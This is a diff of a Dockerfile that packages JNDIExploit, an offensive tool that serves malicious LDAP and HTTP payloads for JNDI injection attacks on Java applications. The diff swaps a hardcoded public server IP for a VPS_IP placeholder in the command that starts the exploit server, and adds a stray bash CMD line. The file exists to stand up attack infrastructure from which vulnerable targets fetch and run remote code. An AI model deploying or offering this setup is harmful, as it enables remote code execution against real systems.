@@ -4,6 +4,7 @@ LABEL maintainer="phithon <root@leavesongs.com>"
 
 ENV FILENAME="jdk-8u20-linux-x64.tar.gz" JAVA_HOME="/opt/jdk"
 RUN mkdir /jndiexploit
+CMD ["bash"]
 COPY JNDIExploit-1.2-SNAPSHOT.jar /jndiexploit
 COPY ./lib /jndiexploit/lib
 RUN set -ex \
@@ -17,5 +18,4 @@ ENV LDAP_PORT=1389
 ENV HTTP_PORT=80
 
 WORKDIR /jndiexploit
-
-CMD ["/bin/bash" "-c" "java -jar ./JNDIExploit-1.2-SNAPSHOT.jar --ip 139.155.81.10 --ldapPort \"${LDAP_PORT}\" --httpPort \"${HTTP_PORT}\""]
+CMD ["sh","-c","java -jar /jndiexploit/JNDIExploit-1.2-SNAPSHOT.jar --ip VPS_IP --ldapPort \"${LDAP_PORT}\" --httpPort \"${HTTP_PORT}\""]
